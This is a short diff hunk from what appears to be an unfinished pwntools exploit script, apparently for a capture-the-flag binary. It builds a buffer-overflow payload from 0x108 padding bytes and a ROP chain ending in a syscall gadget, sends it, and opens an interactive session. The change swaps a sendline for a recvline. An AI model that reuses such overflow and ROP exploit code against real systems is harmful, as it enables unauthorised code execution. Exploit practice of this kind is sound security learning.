@@ -40,7 +40,7 @@ rop += rebase_0(0x00000000000170a4) # 0x00000000004170a4: syscall; ret;
 payload  = 0x108 * b'A'
 payload += rop
 
-p.sendline()
+p.recvline()
 p.sendline(payload)
 p.interactive()
 # NOT FINISHED
